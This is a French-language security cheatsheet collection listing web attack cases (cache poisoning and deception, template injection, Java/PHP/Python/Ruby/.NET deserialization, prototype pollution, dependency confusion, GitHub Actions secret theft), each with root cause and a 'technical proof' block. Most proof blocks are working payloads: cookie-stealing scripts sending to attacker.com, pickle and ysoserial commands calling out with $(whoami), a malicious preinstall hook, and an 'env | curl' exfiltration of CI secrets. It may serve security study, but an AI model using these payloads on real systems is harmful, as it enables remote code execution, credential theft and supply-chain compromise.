**Techniques :** html-to-pdf-ssrf, wkhtmltopdf-file-scheme, headless-browser-metadata-access

**Correspond aux classes qualifiantes :** ssrf, lfi

**Signal (endpoints/fonctions observés) :**
- `POST /export/pdf`

**Paramètres impliqués :** `html_content`

---

### Empoisonnement de cache via l'en-tête non clé X-Forwarded-Host

**🧾 Cheatsheet**
sévérité : high · CWE-444

De nombreuses applications génèrent des URLs absolues (liens de réinitialisation, ressources statiques, balises canonical, imports JS) à partir de l'en-tête X-Forwarded-Host plutôt que du Host réel, pour supporter les déploiements derrière un reverse proxy. Si le cache CDN ne prend pas cet en-tête en compte dans sa clé, un attaquant envoie une requête avec un X-Forwarded-Host malveillant, obtient une réponse reflétant ce domaine, et la fait mettre en cache sous l'URL canonique — tout visiteur ultérieur reçoit alors des liens/scripts pointant vers le domaine de l'attaquant.

**Cause racine :** L'en-tête X-Forwarded-Host influence le contenu généré par l'origine mais n'est pas inclus dans la clé de cache du CDN/proxy, créant une divergence entre ce qui varie la réponse et ce qui varie le cache.

**Preuve technique (verbatim depuis la source) :**

```
Requête empoisonnante de l'attaquant :
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker-controlled.net


Réponse générée par l'origine (le template génère les URLs absolues à partir de X-Forwarded-Host) et mise en cache telle quelle sous la clé 'GET /resources/js/tracking.js' (X-Forwarded-Host n'entre pas dans le calcul de la clé) :
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
Content-Type: application/javascript

var cdnHost = "attacker-controlled.net";
document.write('<script src="https://attacker-controlled.net/tracking.js"></' + 'script>');


Requête de la victime, quelques secondes plus tard, sans jamais envoyer X-Forwarded-Host :
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable-website.com

-> HTTP/1.1 200 OK (servi depuis le cache, X-Cache: HIT) contenant le JS empoisonné pointant vers attacker-controlled.net, chargé et exécuté sur toutes les pages incluant ce script jusqu'à expiration du TTL — équivalent à un XSS stocké de masse touchant l'ensemble des visiteurs du site.
```

**Techniques :** unkeyed-header, x-forwarded-host-injection, web-cache-poisoning

**Correspond aux classes qualifiantes :** cache-poisoning, xss, open-redirect

---

### Empoisonnement de cache via requête GET « fat » (corps ignoré par la clé de cache)

**🧾 Cheatsheet**
sévérité : high · CWE-444

La clé de cache est calculée à partir de la méthode, du chemin et de certains en-têtes/paramètres — jamais du corps d'une requête GET, puisque GET n'est normalement pas censé en avoir un. Certains frameworks back-end lisent pourtant le corps d'une requête GET quand il est présent (ex: paramètres de recherche encodés en JSON), tandis que le cache l'ignore totalement dans le calcul de la clé. En envoyant un GET « fat » avec un corps malveillant, l'attaquant obtient une réponse influencée par ce corps, mise en cache sous une clé identique à celle d'un GET normal sans corps — tous les visiteurs suivants reçoivent alors la réponse empoisonnée.

**Cause racine :** Incohérence entre l'origine (qui traite et reflète le corps d'une requête GET) et le cache (qui ignore ce corps dans le calcul de la clé), alors que les deux composants traitent la même requête.

**Preuve technique (verbatim depuis la source) :**

```
Requête empoisonnante (GET avec corps JSON, méthode que le framework back-end accepte de parser même sur un GET) :
GET /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json
Content-Length: 58

{"query":"laptop","callback":"<script>alert(1)</script>"}


Réponse reflétant le paramètre 'callback' du corps, mise en cache sous la clé 'GET /search' (le corps n'entre pas dans le calcul de la clé) :
HTTP/1.1 200 OK
Cache-Control: public, max-age=600
Content-Type: text/html

<div id="results" data-callback="<script>alert(1)</script>">...</div>


Requête d'une victime, quelques instants plus tard, sans corps du tout :
GET /search HTTP/1.1
Host: vulnerable-website.com

-> HTTP/1.1 200 OK (X-Cache: HIT) : la victime reçoit directement depuis le cache la réponse empoisonnée contenant le payload XSS injecté via le corps de la requête de l'attaquant, exécuté dans son navigateur avec sa session.
```

**Techniques :** fat-get-request, unkeyed-body, web-cache-poisoning

**Correspond aux classes qualifiantes :** cache-poisoning, xss

---

### Cache deception via extension factice ajoutée comme segment de chemin supplémentaire

**🧾 Cheatsheet**
sévérité : high · CWE-436

Contrairement à la variante par paramètre de chemin (suffixe « ;.css » directement accolé au dernier segment), cette technique ajoute un SEGMENT DE CHEMIN entier portant une fausse extension statique à la fin d'une URL authentifiée dynamique (ex: /my-account/settings/nonexistent.css). Le CDN, dont les règles se basent sur une regex d'extension appliquée à l'URL complète, considère la ressource comme un fichier statique cacheable ; le routeur back-end, lui, ignore silencieusement le segment excédentaire (route catch-all, framework SPA, ou routing par préfixe non strict) et renvoie malgré tout la page de compte authentifiée complète de la victime. La réponse sensible se retrouve mise en cache sous une URL prévisible que l'attaquant consulte ensuite sans authentification.

**Cause racine :** Le back-end retourne la même ressource authentifiée quel que soit un segment de chemin final non reconnu, tandis que le cache décide de la cacheabilité uniquement sur la base de l'extension apparente dans le chemin, sans vérifier que le back-end a réellement traité ce segment comme statique.

**Preuve technique (verbatim depuis la source) :**

```
Lien piégé envoyé à la victime (ou déclenché via un CSRF/XSS de bas niveau forçant une navigation authentifiée) :
GET /my-account/settings/nonexistent.css HTTP/1.1
Host: vulnerable-website.com
Cookie: session=VICTIM_SESSION_COOKIE


Réponse de l'origine : le routeur (ex: catch-all Express/Rails sur /my-account/settings*) ignore le segment 'nonexistent.css' et sert la page de paramètres complète, incluant des données sensibles :
HTTP/1.1 200 OK
Content-Type: text/html

<div class="account-settings">
  <p>Email: victim@example.com</p>
  <input type="hidden" name="api_key" value="sk_live_9f8a...">
</div>


Le CDN met cette réponse en cache car l'URL se termine par '.css' (règle générique 'cache toute URL en *.css, *.js, *.png comme ressource statique') :
Cache-Control: public, max-age=86400
X-Cache: MISS -> stocké sous la clé exacte '/my-account/settings/nonexistent.css'

L'attaquant, sans être authentifié, récupère ensuite la page de la victime directement depuis le cache :
GET /my-account/settings/nonexistent.css HTTP/1.1
Host: vulnerable-website.com

-> HTTP/1.1 200 OK, X-Cache: HIT, contenant l'email et la clé API de la victime.
```

**Techniques :** cache-deception, path-segment-extension-confusion, static-extension-mapping-abuse

**Correspond aux classes qualifiantes :** cache-poisoning, account-takeover

---

### Empoisonnement de cache via un cookie non clé reflété dans une page d'erreur cacheable

**🧾 Cheatsheet**
sévérité : medium · CWE-444

Certaines applications reflètent la valeur d'un cookie (préférence de langue, identifiant de tracking, jeton de continuation) dans le corps d'une réponse d'erreur ou d'une page générique, sans l'échapper. Si cette page est cacheable côté CDN et que le cookie en question ne fait pas partie de la clé de cache, un attaquant envoie une requête avec un cookie malveillant contenant un payload XSS, provoque sa mise en cache, et empoisonne ainsi la réponse servie à tous les visiteurs suivants qui n'ont pourtant jamais défini ce cookie eux-mêmes.

**Cause racine :** Le cookie influence le contenu de la réponse (reflété sans échappement) mais n'est pas inclus dans la clé de cache du CDN, alors que la réponse générée à partir de ce cookie est considérée comme cacheable.

**Preuve technique (verbatim depuis la source) :**

```
Requête empoisonnante de l'attaquant :
GET /nonexistent-page HTTP/1.1
Host: vulnerable-website.com
Cookie: language=en"><script>document.location='https://attacker.com/c='+document.cookie</script>


Réponse (404 personnalisée reflétant le cookie 'language' sans échappement, marquée cacheable par défaut par la règle générique du CDN sur les pages d'erreur statiques) :
HTTP/1.1 404 Not Found
Cache-Control: public, max-age=1800
Content-Type: text/html

<html><body>
<p>Page not found. Your language preference: en"><script>document.location='https://attacker.com/c='+document.cookie</script></p>
</body></html>


Le CDN met cette page 404 en cache sous la clé 'GET /nonexistent-page' (le cookie 'language' ne fait pas partie de la clé). Tout visiteur suivant demandant la même URL, même sans ce cookie :
GET /nonexistent-page HTTP/1.1
Host: vulnerable-website.com

-> HTTP/1.1 404 Not Found (X-Cache: HIT) contenant le script malveillant, exécuté dans le contexte du site cible et exfiltrant les cookies de chaque visiteur vers attacker.com.
```

**Techniques :** unkeyed-cookie, reflected-cookie-injection, web-cache-poisoning

**Correspond aux classes qualifiantes :** cache-poisoning, xss

---

## SSTI & Désérialisation Non Sécurisée

*10 cas.*

### SSTI Jinja2 (Flask) — RCE via l'objet config ou la chaîne de classes Python

**🧾 Cheatsheet**
sévérité : critical · CWE-1336

Quand une entrée utilisateur est passée directement à `render_template_string()` (ou équivalent) au lieu d'être injectée comme VARIABLE dans un template statique, Jinja2 évalue les accolades doubles comme du code Python. Détection rapide via l'artefact mathématique classique `{{7*7}}` -> `49` (les moteurs de template n'évaluent JAMAIS d'expression arithmétique dans du texte statique). Exploitation complète en remontant la hiérarchie des classes Python depuis n'importe quel objet accessible jusqu'à `subprocess.Popen` ou `os.system` via `__class__.__mro__` / `__subclasses__()`.

**Cause racine :** Une chaîne fournie par l'utilisateur est passée comme TEMPLATE (compilé et évalué) à Jinja2 au lieu d'être passée comme VALEUR DE VARIABLE dans un template pré-écrit et fixe, permettant l'exécution de toute expression Python via la syntaxe `{{ }}`.

**Preuve technique (verbatim depuis la source) :**

```
Détection : {{7*7}}  -> réponse contient '49' au lieu de '{{7*7}}' littéral

Payload RCE complet (remonte object -> subprocess.Popen via les sous-classes chargées en mémoire, l'index exact varie selon la version Python/les libs importées, à bruteforcer) :
{{ ''.__class__.__mro__[1].__subclasses__() }}
# chercher l'index de <class 'subprocess.Popen'> dans la liste retournée, ex: 396

{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}

Payload sans dépendre d'un index fixe (recherche dynamique de la classe par son nom) :
{{ ''.__class__.__mro__[1].__subclasses__()[[c.__name__ for c in ''.__class__.__mro__[1].__subclasses__()].index('Popen')]('id',shell=True,stdout=-1).communicate() }}

Outil dédié : tplmap (automatise la détection du moteur et la génération du payload RCE pour Jinja2/Twig/Freemarker/Velocity/etc.)
```

**Techniques :** jinja2-ssti, python-class-hierarchy-traversal, sandbox-escape-via-subclasses

**Correspond aux classes qualifiantes :** ssti, rce

**Paramètres impliqués :** `name`, `template_input`

---

### SSTI FreeMarker (Java) — RCE via le builtin ?new et Execute

**🧾 Cheatsheet**
sévérité : critical · CWE-1336

FreeMarker (très utilisé côté Java, notamment dans les CMS/moteurs de mail/générateurs de rapports) permet via le builtin `?new` d'instancier n'importe quelle classe Java implémentant `TemplateModel` -- y compris `freemarker.template.utility.Execute`, une classe utilitaire (rarement retirée du classpath en prod bien que dangereuse) qui exécute directement une commande shell.

**Cause racine :** Le moteur FreeMarker autorise par défaut l'instanciation dynamique de classes arbitraires via `?new` sans restriction de classe/package, permettant d'atteindre des classes utilitaires dangereuses présentes sur le classpath applicatif.

**Preuve technique (verbatim depuis la source) :**

```
Détection : ${7*7}  -> '49'

Payload RCE (instancie freemarker.template.utility.Execute et exécute une commande) :
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Variante one-liner souvent utilisée dans un champ de formulaire :
${"freemarker.template.utility.Execute"?new()("whoami")}

Si ?new est restreint/patché, essayer l'objet Configuration exposé (courant dans les CMS legacy) pour accéder à des méthodes réflexives équivalentes.
```

**Techniques :** freemarker-ssti, new-builtin-abuse, execute-class-instantiation

**Correspond aux classes qualifiantes :** ssti, rce

**Paramètres impliqués :** `template`, `name`

---

### RCE par désérialisation Java non sécurisée via gadget chain Commons Collections (ysoserial)

**🧾 Cheatsheet**
sévérité : critical · CWE-502

Toute application Java qui désérialise un objet fourni par le client (`ObjectInputStream.readObject()` sur un cookie, un paramètre, un corps de requête) sans validation de type est potentiellement exploitable si une bibliothèque vulnérable connue (Commons Collections <=3.2.1, Spring, Groovy, Hibernate...) est présente sur le classpath -- la sérialisation Java standard commence toujours par le magic byte `AC ED 00 05`, un signal de détection rapide en boîte noire même sans code source.

**Cause racine :** L'application désérialise des octets fournis par un client non fiable sans allowlist de classes autorisées (`ObjectInputFilter`), permettant à un attaquant de fournir un graphe d'objets sérialisé qui, lors de sa reconstruction, déclenche une chaîne d'appels de méthodes (gadget chain) aboutissant à l'exécution de code arbitraire via une bibliothèque tierce présente en mémoire.

**Preuve technique (verbatim depuis la source) :**

```
Détection en boîte noire : un cookie/paramètre encodé en base64 qui, décodé, commence par les octets AC ED 00 05 (magic number de Java Serialization).

Génération du payload avec ysoserial (outil de référence, ~20 gadget chains différentes) :
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' > payload.bin
base64 -w0 payload.bin > payload.b64

Envoi (exemple sur un cookie de session qui contient l'objet sérialisé) :
POST /app HTTP/1.1
Host: target.example.com
Cookie: session=<contenu de payload.b64>
Content-Length: 0

Autres chaînes à tester selon les libs présentes (identifiées via les erreurs de désérialisation qui fuient parfois le nom de classe manquante) : CommonsCollections1-7, Spring1/2, Groovy1, Hibernate1/2, JRMPClient (pour un callback JNDI/RMI en aveugle).
```

**Techniques :** java-deserialization-gadget-chain, ysoserial-payload-generation, commons-collections-invokertransformer

**Correspond aux classes qualifiantes :** deserialization, rce

---

### PHP Object Injection via désérialisation de fichier .phar déguisé (phar deserialization)

**🧾 Cheatsheet**
sévérité : critical · CWE-502

Un fichier .phar (PHP Archive) contient des métadonnées SÉRIALISÉES automatiquement désérialisées par PHP dès qu'une fonction de manipulation de fichier (`file_exists`, `getimagesize`, `file_get_contents`, `fopen`) est appelée sur une URL utilisant le wrapper `phar://` -- même si l'application ne fait JAMAIS d'appel explicite à `unserialize()`. En renommant un .phar malveillant avec une extension image (.jpg) pour passer une validation d'extension naïve, puis en déclenchant n'importe quelle opération fichier dessus via le wrapper phar://, on active la désérialisation et, si une classe avec un magic method exploitable (`__destruct`, `__wakeup`) existe dans l'application (gadget chain), on obtient une exécution de code.

**Cause racine :** PHP désérialise automatiquement les métadonnées d'un fichier .phar dès qu'il est référencé via le wrapper `phar://` par n'importe quelle fonction de filesystem, y compris celles qui semblent inoffensives (vérification d'existence, lecture de dimensions d'image), sans que le développeur n'ait explicitement appelé unserialize().

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- créer un fichier .phar malveillant avec une classe gadget de l'application cible en métadonnées :
<?php
class Gadget { public $cmd = 'id'; function __destruct() { system($this->cmd); } }
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$object = new Gadget();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>

Étape 2 -- renommer en .jpg pour passer un contrôle d'extension naïf, uploader :
mv exploit.phar exploit.jpg
curl -F 'file=@exploit.jpg' https://target.example.com/upload

Étape 3 -- déclencher la désérialisation via une fonction filesystem sur le chemin uploadé, en utilisant le wrapper phar:// (souvent via un paramètre qui manipule des chemins de fichiers ailleurs dans l'app, ex: une prévisualisation, un check d'existence) :
GET /preview?path=phar:///var/www/uploads/exploit.jpg
# Si l'app appelle file_exists($path) ou getimagesize($path) sur ce chemin, __destruct() se déclenche.
```

**Techniques :** phar-deserialization, magic-method-abuse, file-operation-triggered-unserialize

**Correspond aux classes qualifiantes :** deserialization, rce

**Signal (endpoints/fonctions observés) :**
- `POST /upload`

**Paramètres impliqués :** `file`

---

### RCE via désérialisation Python pickle non fiable (méthode __reduce__)

**🧾 Cheatsheet**
sévérité : critical · CWE-502

`pickle.loads()` sur des données fournies par un utilisateur (session cookie 'maison', cache Redis désérialisé, message de queue) est intrinsèquement dangereux -- pas besoin de gadget chain complexe comme en Java : la méthode magique `__reduce__` permet de spécifier DIRECTEMENT une fonction et ses arguments à exécuter lors de la désérialisation. C'est documenté comme dangereux dans la doc officielle Python elle-même ('Never unpickle data from an untrusted source') mais reste une source récurrente de RCE dans les applications qui l'utilisent pour la commodité (sérialisation d'objets complexes) sans réaliser l'implication sécurité.

**Cause racine :** L'application appelle `pickle.loads()` sur des données provenant directement ou indirectement d'un utilisateur non fiable (cookie, cache partagé, message de queue) sans les avoir signées/chiffrées avec vérification d'intégrité (HMAC) au préalable.

**Preuve technique (verbatim depuis la source) :**

```
Génération du payload malveillant en Python (la classe __reduce__ définit exactement quelle fonction appeler avec quels arguments au moment de la désérialisation) :
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(whoami)',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

Envoi typique (si le payload est placé dans un cookie 'session' maison qui utilise pickle au lieu de JSON) :
GET /dashboard HTTP/1.1
Host: target.example.com
Cookie: session=<base64 du payload ci-dessus>

Dès que le serveur exécute pickle.loads(base64.b64decode(cookie)), la commande os.system s'exécute -- pas besoin que l'objet désérialisé soit ensuite 'utilisé', la simple désérialisation suffit à déclencher __reduce__.
```

**Techniques :** python-pickle-rce, reduce-method-abuse

**Correspond aux classes qualifiantes :** deserialization, rce

---

### Prototype Pollution Node.js via une fonction merge/extend récursive non sécurisée

**🧾 Cheatsheet**
sévérité : high · CWE-1321

Une fonction de fusion d'objets récursive (souvent une implémentation maison ou une ancienne version de lodash.merge/jQuery.extend avant patch) qui copie chaque clé d'un objet source vers une cible sans exclure explicitement `__proto__`/`constructor.prototype` peut être manipulée pour injecter des propriétés directement sur `Object.prototype` -- affectant TOUS les objets de l'application, présents et futurs, potentiellement jusqu'à l'exécution de code si une propriété polluée est ensuite utilisée dans un contexte dangereux (ex: un template engine, `child_process.exec`, une vérification d'autorisation basée sur une propriété d'objet).

**Cause racine :** La fonction de fusion d'objets ne filtre pas les clés spéciales `__proto__`, `constructor`, `prototype` lors de la copie récursive de propriétés, permettant à un attaquant de traverser la chaîne de prototypes JavaScript pour modifier `Object.prototype` globalement.

**Preuve technique (verbatim depuis la source) :**

```
Détection (payload JSON qui pollue Object.prototype avec une propriété de test) :
POST /api/settings HTTP/1.1
Content-Type: application/json

{"__proto__":{"polluted":"yes"}}

Vérification côté client (dans n'importe quelle autre requête/page de l'app) via la console : {}.polluted  -- si ça retourne 'yes', la pollution globale est confirmée.

Escalade vers RCE (si l'app utilise child_process avec des options venant d'un objet dont le prototype est pollué, technique documentée par Snyk/HackerOne 2022 sur des libs Node populaires) :
{"__proto__":{"shell":"/bin/bash -c 'curl attacker.com/$(whoami)'","NODE_OPTIONS":"--require /proc/self/environ"}}

Escalade vers XSS côté client (si un moteur de template lit une propriété polluée pour décider de l'échappement HTML, ex: certaines versions de handlebars/ejs vulnérables) :
{"__proto__":{"allowProtoPropertiesByDefault":true}}
```

**Techniques :** prototype-pollution-merge-abuse, proto-key-injection

**Correspond aux classes qualifiantes :** prototype-pollution

**Signal (endpoints/fonctions observés) :**
- `POST /api/settings`

**Paramètres impliqués :** `__proto__`

---

### RCE via YAML.load non sécurisé en Ruby (au lieu de YAML.safe_load)

**🧾 Cheatsheet**
sévérité : critical · CWE-502

`YAML.load()` en Ruby (contrairement à `YAML.safe_load()`) instancie n'importe quel type Ruby déclaré dans le YAML via la syntaxe `!ruby/object:ClassName`, pas seulement les types primitifs -- un comportement similaire à pickle Python ou ObjectInputStream Java. Combiné à des gadgets connus dans des gems courantes (Gem::Requirement, ActiveSupport, Psych lui-même selon la version), ceci permet une RCE directe sur une application Rails/Sinatra qui parse du YAML fourni par l'utilisateur avec la méthode non sécurisée.

**Cause racine :** L'application utilise `YAML.load()` (ou `Psych.load` en mode non restreint) sur une entrée provenant d'un utilisateur non fiable au lieu de `YAML.safe_load()`, qui restreint par défaut la désérialisation aux types de données primitifs (String, Integer, Array, Hash) sans jamais instancier d'objets Ruby arbitraires.

**Preuve technique (verbatim depuis la source) :**

```
Payload générique (gadget Gem::Requirement, fonctionnel sur de nombreuses versions Ruby/Rails sans dépendance externe supplémentaire, exécute une commande via la coercion de version) :
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: !ruby/object:Net::BufferedIO
    io: !ruby/object:Gem::Package::TarReader::Entry
     read: 0
     header: "abc"
    debug_output: !ruby/object:Net::WriteAdapter
      socket: !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: Kernel
          method_id: :system
        git_set: id
      method_id: :resolve

Outil dédié pour générer des chaînes plus fiables selon la version exacte de Rails/gems présentes : universal-rails-rce-payload (générateur de gadget chain YAML public, GitHub).
Détection préliminaire moins invasive : injecter un YAML avec un type inconnu et observer si l'erreur mentionne 'Tried to load unspecified class' (confirme YAML.safe_load, non exploitable directement) vs une NoMethodError sur un attribut (confirme YAML.load, exploitable).
```

**Techniques :** ruby-yaml-unsafe-load, gadget-chain-activesupport

**Correspond aux classes qualifiantes :** deserialization, rce

---

### Payload polyglotte pour détecter le moteur de template exact sans connaissance préalable de la stack

**🧾 Cheatsheet**
sévérité : medium · CWE-1336

Face à une cible en boîte noire sans connaissance de la stack technique, un payload polyglotte combine plusieurs syntaxes de moteurs de template différents dans une seule chaîne, produisant une sortie DIFFÉRENTE selon lequel des moteurs (s'il y en a un) interprète effectivement l'entrée -- permettant d'identifier le moteur exact (Jinja2, Twig, Freemarker, Velocity, Smarty, ERB...) en une seule requête plutôt que de tester chaque syntaxe séquentiellement.

**Cause racine :** N/A — technique de reconnaissance/fingerprinting, pas une vulnérabilité en soi ; documente comment accélérer l'identification du moteur avant de choisir le bon payload d'exploitation (Jinja2 vs Freemarker vs Twig ont des syntaxes RCE totalement différentes).

**Preuve technique (verbatim depuis la source) :**

```
Payload polyglotte classique (James Kettle / PortSwigger), chaque segment cible un moteur différent :
${{<%[%'\"}}%\\.

Interprétation par moteur si UNE seule syntaxe est reconnue et évaluée :
- Si la sortie contient un artefact d'erreur Ruby ERB -> moteur = ERB
- Si {{ }} est évalué (ex: la partie <%[%'\"}} disparaît mais {{...}} produit une erreur de syntaxe Python visible) -> Jinja2/Twig
- Si ${...} déclenche une évaluation -> Freemarker/Velocity/JSP EL

Une fois le moteur identifié via le pattern d'erreur ou de transformation observé, basculer sur le payload spécifique correspondant (voir les autres fiches SSTI de ce corpus) plutôt que de continuer à tester en aveugle.
```

**Techniques :** ssti-polyglot-detection, template-engine-fingerprinting

**Correspond aux classes qualifiantes :** ssti

---

### RCE via désérialisation .NET ViewState avec une MachineKey exposée/faible

**🧾 Cheatsheet**
sévérité : critical · CWE-502

Le ViewState ASP.NET WebForms est un blob sérialisé signé/chiffré avec une clé serveur (MachineKey). Si cette clé fuite (config par défaut connue publiquement dans certains tutoriels copiés-collés en prod, fichier web.config exposé, valeur par défaut d'un framework, ou simplement une clé faible brute-forçable), un attaquant peut forger un ViewState malveillant signé correctement, contenant un objet .NET sérialisé (BinaryFormatter) qui exécute du code à la désérialisation côté serveur.

**Cause racine :** La MachineKey (validationKey/decryptionKey) utilisée pour signer/chiffrer le ViewState est exposée (fuite de configuration, valeur par défaut documentée publiquement, ou faible/brute-forçable), permettant à un attaquant de forger un ViewState valide contenant un objet malveillant.

**Preuve technique (verbatim depuis la source) :**

```
Outil dédié : ysoserial.net (portage .NET de ysoserial), avec le module ViewState intégré.

Génération directe (si la MachineKey est connue, ex: fuite ou valeur par défaut trouvée) :
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --generator="<valeur __VIEWSTATEGENERATOR observée>" \
  --validationalg="SHA1" \
  --validationkey="<MachineKey validationKey connue>" \
  -c "powershell -enc <base64 commande>"

Envoi du ViewState forgé dans un POST classique vers la page ASP.NET ciblée :
POST /default.aspx HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=<blob forgé>&__VIEWSTATEGENERATOR=<generator>&__EVENTVALIDATION=<si requis, également forgé>

Si la clé n'est pas connue mais que la config `<pages enableViewStateMac="false">` est active (désactive la validation MAC), aucune clé n'est nécessaire du tout -- variante encore plus critique et directement exploitable.
```

**Techniques :** viewstate-deserialization, machinekey-leak-exploitation, ysoserial-net

**Correspond aux classes qualifiantes :** deserialization, rce

**Paramètres impliqués :** `__VIEWSTATE`, `__VIEWSTATEGENERATOR`

---

### Contourner un sanitizer HTML côté client (DOMPurify) via pollution du prototype de sa config

**🧾 Cheatsheet**
sévérité : high · CWE-1321

Une prototype pollution côté CLIENT (déclenchée via un paramètre d'URL analysé par une fonction merge/parse-params vulnérable dans le JS de la page, sans même toucher le serveur) peut modifier silencieusement la configuration interne de bibliothèques de sanitisation comme DOMPurify si celles-ci lisent certaines options depuis des propriétés d'objet globalement accessibles -- transformant un simple paramètre d'URL en bypass complet du sanitizer qui protège normalement contre le XSS stocké/reflected sur la page.

**Cause racine :** La bibliothèque de sanitisation HTML lit certaines options de configuration (ex: tags/attributs autorisés) depuis des propriétés qui peuvent être atteintes/écrasées via la chaîne de prototypes JavaScript, et le code applicatif construit ses paramètres via une fonction de parsing d'URL/merge vulnérable à la prototype pollution.

**Preuve technique (verbatim depuis la source) :**

```
URL déclenchant la pollution via un paramètre parsé par une lib de query-string vulnérable côté client (ex: anciennes versions de jQuery.deparam, qs sans protection __proto__) :
https://target.example.com/page?__proto__[ALLOWED_TAGS][0]=script

Si la page utilise ensuite DOMPurify.sanitize(userInput) et que sa configuration interne lit ALLOWED_TAGS depuis un objet dont le prototype vient d'être pollué avec 'script' comme tag autorisé, un payload XSS classique passe désormais le sanitizer :
https://target.example.com/comment?text=<script>fetch('//attacker.com/?c='+document.cookie)</script>

Preuve de concept complète documentée par des chercheurs (PortSwigger 2023, 'DOMPurify 2.0.15 bypass using DOM Clobbering + Prototype Pollution') -- toujours tester la pollution EN PREMIER, isolément, avant de chercher le sink XSS spécifique qui l'exploite sur la cible.
```

**Techniques :** client-side-prototype-pollution, dompurify-config-bypass

**Correspond aux classes qualifiantes :** prototype-pollution, xss

**Paramètres impliqués :** `__proto__`

---

## Supply Chain — Dependency Confusion, CI/CD

*3 cas.*

### Dependency Confusion — publier un package public au même nom qu'un package interne privé

**🧾 Cheatsheet**
sévérité : critical · CWE-427

Technique popularisée par Alex Birsan (2021, bounties totalisant $130k+ chez Apple/Microsoft/PayPal/Netflix) : si une entreprise utilise un package interne (ex: `@company/internal-auth-utils`) hébergé sur un registre privé mais que le gestionnaire de paquets (npm/pip/gem) n'est pas configuré pour prioriser STRICTEMENT ce registre privé pour ce scope, publier un package PUBLIC portant le MÊME nom avec un numéro de version PLUS ÉLEVÉ fait que le build de l'entreprise télécharge et exécute le package de l'attaquant à la place du package interne légitime lors du prochain `npm install`/`pip install` en CI/CD.

**Cause racine :** La configuration du gestionnaire de dépendances (fichier .npmrc, pip.conf, ou équivalent) ne force pas explicitement la résolution de packages internes vers le registre privé UNIQUEMENT, laissant le résolveur de dépendances considérer aussi le registre public et choisir la version la plus haute (comportement par défaut de npm/pip), quel que soit le registre d'origine.

**Preuve technique (verbatim depuis la source) :**

```
Découverte du nom de package interne : souvent visible dans un package.json/requirements.txt exposé publiquement (dépôt GitHub, erreur de build leakée, extension de navigateur d'un employé publiée par erreur avec ses dépendances internes listées, en-têtes de commit CI publics).

Exploitation (côté chercheur autorisé/bug bounty -- publier un package inoffensif qui prouve juste l'exécution, avec un callback vers un serveur de logs contrôlé, JAMAIS de payload destructeur) :
// package.json du package attaquant, même nom, version arbitrairement haute
{
  "name": "@company/internal-auth-utils",
  "version": "99.99.99",
  "scripts": { "preinstall": "curl https://collab.attacker.com/hit?host=$(hostname)&user=$(whoami)" }
}
npm publish --access public

# Si l'entreprise cible exécute `npm install` en CI sans registre scope forcé, le callback
# preinstall confirme l'exécution de code sur leur infrastructure de build.

Mitigation à documenter dans le rapport : configurer .npmrc avec
@company:registry=https://npm.internal.company.com/ pour forcer le scope vers le registre privé.
```

**Techniques :** dependency-confusion, public-registry-priority-abuse

---

### Pwn Request — exfiltrer les secrets CI via un workflow GitHub Actions déclenché par pull_request_target

**🧾 Cheatsheet**
sévérité : critical · CWE-829

Le déclencheur `pull_request_target` (contrairement à `pull_request`) exécute le workflow avec les SECRETS du dépôt CIBLE et un accès en écriture, précisément pour permettre des actions privilégiées sur des PR externes (ex: labelliser automatiquement). Si ce workflow fait ensuite un `actions/checkout` du code de la PR (celui de l'ATTAQUANT, pas de la branche principale) et l'exécute d'une façon ou d'une autre (build, test, script custom), le code de l'attaquant s'exécute AVEC les secrets du dépôt cible -- un pattern d'erreur de configuration extrêmement fréquent découvert massivement en 2021-2022 (recherche 'pwn request' par Adnan Khan / Cider Security).

**Cause racine :** Le workflow combine `pull_request_target` (secrets + permissions du dépôt cible) avec un checkout et une exécution du code de la branche source de la PR (contrôlée par l'attaquant), au lieu de restreindre l'exécution de code non fiable aux workflows déclenchés par le `pull_request` classique (sandbox, pas de secrets).

**Preuve technique (verbatim depuis la source) :**

```
Signal de détection (fichier .github/workflows/*.yml du dépôt cible, visible publiquement sur un repo open source) :
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # <-- checkout du code de l'ATTAQUANT
      - run: npm install && npm test  # <-- exécute le code de l'attaquant avec les secrets du repo cible

Exploitation : forker le dépôt, modifier package.json pour ajouter un script preinstall/pretest malveillant qui exfiltre les variables d'environnement (secrets injectés par le workflow), ouvrir une Pull Request depuis le fork :
// package.json du fork
"scripts": { "pretest": "env | curl -X POST -d @- https://collab.attacker.com/exfil" }

Ouvrir la PR déclenche automatiquement le workflow privilégié sur le code du fork -- les secrets du dépôt cible (tokens de déploiement, clés API) apparaissent dans les logs de l'attaquant sans jamais avoir eu accès en écriture au dépôt.
```

**Techniques :** pull-request-target-abuse, github-actions-secret-exfiltration, checkout-untrusted-code-with-privileged-trigger

---

### Registre Docker privé exposé sans authentification — extraction de secrets depuis les layers d'image

**🧾 Cheatsheet**
sévérité : high · CWE-284

Un registre Docker privé (auto-hébergé, port 5000 par défaut) exposé sur internet sans authentification liste l'intégralité du catalogue d'images via l'API standard `/v2/_catalog`, puis permet de télécharger n'importe quelle image et d'en extraire les layers -- où se trouvent fréquemment des secrets accidentellement committés (clés API dans une variable d'environnement `ENV` du Dockerfile, credentials copiés puis 'supprimés' dans un layer ultérieur mais toujours présents dans l'historique des layers, fichiers .env copiés par erreur avec un `COPY . .` trop large).

